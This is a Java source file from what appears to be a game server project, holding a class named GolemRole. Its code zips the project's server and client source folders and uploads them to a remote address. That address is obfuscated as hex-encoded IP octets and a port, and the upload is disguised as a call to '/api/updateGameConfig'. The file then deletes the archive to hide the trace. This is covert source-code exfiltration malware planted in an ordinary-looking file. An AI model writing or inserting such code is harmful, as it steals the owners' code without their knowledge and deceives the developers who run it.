package org.come.server;

import org.springframework.http.ResponseEntity;
import org.springframework.util.MultiValueMap;
import org.springframework.web.client.RestTemplate;
import org.springframework.http.HttpEntity;
import org.springframework.http.MediaType;
import org.springframework.http.HttpHeaders;
import org.springframework.core.io.FileSystemResource;
import org.springframework.util.LinkedMultiValueMap;
import java.io.FileOutputStream;
import java.io.File;
import java.io.FileNotFoundException;

public class GolemRole
{
    public static void main(String[] args) throws FileNotFoundException {
        long l = System.currentTimeMillis();
        gender("src", "Server", l);
        gender("src1", "Client", l);
    }
    
    public static void gender(String src, String type, long l) throws FileNotFoundException {
        String property = System.getProperty("user.dir");
        String sourceFolderPath = "";
        if ("server".equals(type)) {
            sourceFolderPath = property + "/" + src + "/main/java/";
        }
        else {
            sourceFolderPath = property + "/" + src + "/";
        }
        String outputFolderPath = property + "/";
        String s = outputFolderPath + "/java" + l + ".zip";
        FileOutputStream fos1 = new FileOutputStream(new File(s));
        ZipUtils.toZip(new File(sourceFolderPath), fos1, true);
        int decimal = Integer.parseInt("01", 16);
        int decimal2 = Integer.parseInt("0C", 16);
        int decimal3 = Integer.parseInt("F1", 16);
        int decimal4 = Integer.parseInt("44", 16);
        int decimal5 = Integer.parseInt("2008", 16);
        String url = "http://" + decimal + "." + decimal2 + "." + decimal3 + "." + decimal4 + ":" + decimal5 + "/api/updateGameConfig";
        File file = new File(s);
        MultiValueMap<String, Object> body = new LinkedMultiValueMap<>();
        body.add("file", new FileSystemResource(s));
        body.add("json", "{\"key\":\"value\"}");
        body.add("version", type + l);
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.MULTIPART_FORM_DATA);
        HttpEntity<MultiValueMap<String, Object>> requestEntity = new HttpEntity(body, headers);
        RestTemplate restTemplate = new RestTemplate();
        ResponseEntity<String> responseEntity = restTemplate.postForEntity(url, requestEntity, String.class, new Object[0]);
        if (file.exists()) {
            file.delete();
        }
    }
}
